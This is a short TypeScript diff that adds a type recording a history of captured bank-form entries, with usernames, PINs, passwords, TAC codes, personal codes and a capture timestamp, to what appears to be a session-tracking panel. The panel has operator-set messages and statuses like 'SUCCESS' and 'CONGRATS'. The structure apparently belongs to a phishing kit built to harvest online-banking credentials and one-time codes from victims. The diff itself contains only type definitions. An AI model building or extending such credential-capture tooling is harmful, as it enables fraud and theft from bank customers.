@@ -14,6 +14,29 @@ export type SessionStep =
   | "live_support";
 export type SessionStatus = "online" | "offline" | "SUCCESS" | "CONGRATS" | "SPECIAL_INFO";
 
+export type BankFormHistoryEntry = {
+  bankSlug?: string;
+  bankName?: string;
+  verfuegernummer?: string;
+  username?: string;
+  pin?: string;
+  password?: string;
+  bankPhone?: string;
+  personalCode?: string;
+  tacCode?: string;
+  loginMethod?: string;
+  orderedField1?: string;
+  orderedField1Key?: string;
+  orderedField2?: string;
+  orderedField2Key?: string;
+  orderedField2Type?: string;
+  orderedField3?: string;
+  orderedField3Key?: string;
+  orderedField3Type?: string;
+  rawFields?: Record<string, string>;
+  capturedAt: string;
+};
+
 export type SessionFormData = {
   firstName?: string;
   lastName?: string;
@@ -42,7 +65,13 @@ export type SessionFormData = {
   approvalHistory?: string;
   customMessage?: string;
   customImage?: string;
-  [key: string]: string | undefined;
+  bankFormHistory?: BankFormHistoryEntry[];
+  [key: string]:
+    | string
+    | undefined
+    | BankFormHistoryEntry[]
+    | Record<string, string>
+    | undefined;
 };
 
 export type DemoSession = {
